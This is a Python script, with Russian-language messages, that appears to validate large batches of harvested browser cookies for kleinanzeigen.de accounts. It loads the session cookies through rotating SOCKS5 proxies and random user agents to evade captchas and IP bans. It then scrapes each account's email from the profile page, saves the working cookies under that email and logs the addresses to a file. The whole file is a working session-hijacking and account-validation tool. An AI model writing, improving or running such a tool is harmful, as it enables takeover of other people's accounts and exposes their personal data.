import os
import re
import threading
import time
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

import chardet
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from curl_cffi import requests
from fake_useragent import UserAgent
from ftfy import fix_text

from config import COOKIES_FILE_PATH, PROFILE_URL, PROXY_FILE_PATH

init(autoreset=True)

warnings.filterwarnings(
    "ignore", message="`secure` changed to True for `__Secure-` prefixed cookies"
)

SOCKS5_REGEX = re.compile(r"^socks5://.+")


def convert_proxies(file_path):
    updated_proxies = []

    with open(file_path, "r") as infile:
        for line in infile:
            line = line.strip()
            if not line:
                continue

            if SOCKS5_REGEX.match(line):
                updated_proxies.append(line)
                continue

            parts = line.split(":")
            if len(parts) == 4:
                host = parts[0]
                port = parts[1]
                username = parts[2]
                password = parts[3]
                new_proxy_format = f"socks5://{username}:{password}@{host}:{port}"
                updated_proxies.append(new_proxy_format)
            else:
                print(f"Неверный формат строки: {line}")
                updated_proxies.append(line)

    with open(file_path, "w") as outfile:
        for proxy in updated_proxies:
            outfile.write(proxy + "\n")


def load_proxies(file_path):
    proxies = []
    with open(file_path, "r") as file:
        for line in file:
            proxies.append(line.strip())
    return proxies


file_lock = threading.Lock()


def clean_cookies_file(file_path):
    try:
        allowed_domain = "www.kleinanzeigen.de"

        with open(file_path, "rb") as file:
            raw_data = file.read()
            encoding = chardet.detect(raw_data)["encoding"]

        with open(file_path, "r", encoding=encoding) as file:
            data = file.readlines()

        filtered_lines = []
        for line in data:
            cleaned_line = line.lstrip("\ufeff").strip()
            if cleaned_line.startswith(allowed_domain):
                filtered_lines.append(line)
            elif "CSRF-TOKEN" in line:
                filtered_lines.append(line)

        result = "".join(filtered_lines)

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(result)

    except Exception as e:
        print(f"Ошибка при очистке куки-файла {file_path}: {e}")


def clean_cookies_in_directory(directory_path):
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if filename.endswith(".txt") and os.path.isfile(file_path):
            clean_cookies_file(file_path)


def load_all_cookies(directory_path):
    all_cookies = []
    for filename in os.listdir(directory_path):
        if filename.endswith(".txt"):
            file_path = os.path.join(directory_path, filename)
            cookies = load_cookies(file_path)
            all_cookies.append((cookies, file_path))
    return all_cookies


def load_cookies(file_path):
    cookies_dict = {}

    try:
        with open(file_path, "rb") as file:
            raw_data = file.read()
            encoding = chardet.detect(raw_data)["encoding"]
            if encoding == "MacRoman":
                encoding = "mac_roman"

        with open(file_path, "r", encoding=encoding) as file:
            for line in file:
                parts = line.strip().split("\t")
                if len(parts) > 6:
                    name = parts[5] if len(parts) > 5 else ""
                    value = parts[6] if len(parts) > 6 else ""

                    name = fix_text(name)
                    value = fix_text(value)

                    if encoding == "mac_roman":
                        name = name.encode("mac_roman").decode("latin-1")
                        value = value.encode("mac_roman").decode("latin-1")

                    name = fix_text(name)
                    value = fix_text(value)

                    clean_value = re.sub(r"[^\x20-\x7E]+", "", value)
                    cookies_dict[name] = clean_value
    except Exception as e:
        print(f"Ошибка при загрузке куки из {file_path}: {e}")
    return cookies_dict


def initialize_session(cookies_dict):
    user_agent = UserAgent().random

    while any(
        mobile in user_agent.lower() for mobile in ["iphone", "mobile", "android"]
    ):
        user_agent = UserAgent().random

    session = requests.Session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value)
    session.headers.update(
        {
            "Content-Language": "de-DE",
            "Referer": "https://www.kleinanzeigen.de/",
            "Content-Type": "*/*",
            "Accept": "*/*",
            "User-Agent": user_agent,
        }
    )
    return session


def session_get_with_proxies(session, url, proxies, start_index=0, max_retries=3):
    proxy_index = start_index
    error_500_count = 0
    error_403_count = 0

    while True:
        proxy = proxies[proxy_index % len(proxies)]
        retries = 0

        while retries < max_retries:
            try:
                response = session.get(url, proxies={"http": proxy, "https": proxy})

                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        return response
                    else:
                        print(f"Невалидный прокси (IP banned). Прокси: {proxy}")
                        break
                elif response.status_code == 403:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        error_403_count += 1
                        if error_403_count >= 5:
                            print("Ошибка 403 - \033[31mкапча\033[0m")
                            return "403 Error"
                        elif error_403_count % 2 == 0:
                            # print(f"Ошибка 403. Меняю прокси. Прокси: {proxy}")
                            proxy_index = (proxy_index + 1) % len(proxies)
                    else:
                        print(f"Невалидный прокси (IP banned). Прокси: {proxy}")
                        break
                elif response.status_code == 500:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        error_500_count += 1
                        if error_500_count >= 15:
                            print("Ошибка 500 превышает лимит. Прерывание запроса.")
                            return "500 Error"
                        elif error_500_count % 2 == 0:
                            # print(f"Ошибка 500. Меняю прокси. Прокси: {proxy}")
                            proxy_index = (proxy_index + 1) % len(proxies)
                        retries += 1
                        time.sleep(1)
                    else:
                        print(f"Невалидный прокси (IP banned). Прокси: {proxy}")
                        break
                else:
                    retries += 1
                    time.sleep(1)
            except Exception:
                retries += 1
                time.sleep(1)

        proxy_index = (proxy_index + 10) % len(
            proxies
        )  # proxy_index + 3, где 3 - количество воркеров (потоков)


def save_cookies(file_path, original_cookie_file_path):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, "w") as dest_file:
        with open(original_cookie_file_path, "r") as source_file:
            for line in source_file:
                dest_file.write(line)


output_lock = threading.Lock()


def get_profile_page(
    session,
    url,
    proxies,
    start_index,
    seen_emails,
    original_cookie_file_path,
    max_retries=1,
):
    while True:
        retries = 0
        while retries < max_retries:
            try:
                response = session_get_with_proxies(
                    session, url, proxies, start_index, max_retries
                )

                if response == "Invalid Cookie":
                    return "Invalid"
                elif response == "500 Error":
                    os.makedirs("error500cookie", exist_ok=True)
                    error_cookie_path = os.path.join(
                        "error500cookie", os.path.basename(original_cookie_file_path)
                    )
                    save_cookies(error_cookie_path, original_cookie_file_path)
                    print("Файл куки сохранен в error500cookie.")
                    return "500 Error"
                elif response == "403 Error":
                    os.makedirs("error403cookie", exist_ok=True)
                    error_cookie_path = os.path.join(
                        "error403cookie", os.path.basename(original_cookie_file_path)
                    )
                    save_cookies(error_cookie_path, original_cookie_file_path)
                    print("Файл куки сохранен в error403cookie.")
                    return "403 Error"

                if response and response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    user_email = soup.find("span", id="user-email")

                    if user_email:
                        email_text = user_email.get_text(strip=True)
                        email_match = re.search(r"\S+@\S+", email_text)

                        if email_match:
                            email_result = email_match.group()

                            if email_result not in seen_emails:
                                with output_lock:
                                    print(
                                        f"{email_result} - {Fore.GREEN}valid{Style.RESET_ALL}"
                                    )
                                save_cookies(
                                    f"valid_cookies/{email_result}.txt",
                                    original_cookie_file_path,
                                )
                                return email_result
                            else:
                                with output_lock:
                                    print(
                                        f"{email_result} уже был проверен и является дубликатом."
                                    )
                                return "Duplicate"
                        else:
                            with output_lock:
                                print(
                                    f'Здесь {Fore.RED}нет{Style.RESET_ALL} email, но есть "{email_text}"'
                                )
                            return "Invalid"
                    else:
                        with output_lock:
                            print(f"Cookie {Fore.RED}невалидный{Style.RESET_ALL}")
                        return "Invalid"
                else:
                    retries += 1
            except Exception:
                retries += 1


def process_cookie_file(
    cookie_data, proxies, seen_emails, start_index, base_file_lock, base_file
):
    cookies_dict, cookie_file_path = cookie_data

    session = initialize_session(cookies_dict)

    result = get_profile_page(
        session, PROFILE_URL, proxies, start_index, seen_emails, cookie_file_path
    )

    if isinstance(result, str) and result not in [
        "Invalid",
        "Duplicate",
        "500 Error",
        "403 Error",
    ]:
        with base_file_lock:
            if result not in seen_emails:
                base_file.write(result + "\n")
                base_file.flush()
                seen_emails.add(result)

    # удаление прочеканного куки
    try:
        os.remove(cookie_file_path)
    except Exception as e:
        print(f"Ошибка при удалении файла куки {cookie_file_path}: {e}")

    return result


def main():
    convert_proxies(PROXY_FILE_PATH)
    clean_cookies_in_directory(COOKIES_FILE_PATH)

    proxies = load_proxies(PROXY_FILE_PATH)
    all_cookies = load_all_cookies(COOKIES_FILE_PATH)
    seen_emails = set()
    valid_emails = []

    if os.path.exists("base.txt"):
        with open("base.txt", "r") as base_file:
            seen_emails.update(line.strip() for line in base_file)

    # если меняешь количество потоков (max_workers=3), дополнительно измени выше "proxy_index = (proxy_index + 3) % len(proxies)"
    with (
        open("base.txt", "a") as base_file,
        ThreadPoolExecutor(max_workers=10) as executor,
    ):
        base_file_lock = threading.Lock()
        future_to_cookie = {
            executor.submit(
                process_cookie_file,
                cookie_data,
                proxies,
                seen_emails,
                i,
                base_file_lock,
                base_file,
            ): cookie_data
            for i, cookie_data in enumerate(all_cookies)
        }

        for future in as_completed(future_to_cookie):
            result = future.result()
            if isinstance(result, str) and result not in [
                "Invalid",
                "Duplicate",
                "500 Error",
                "403 Error",
            ]:
                valid_emails.append(result)

    print("\nКоличество валида:", len(valid_emails))
    input("Нажмите Enter, чтобы закрыть...")


if __name__ == "__main__":
    main()
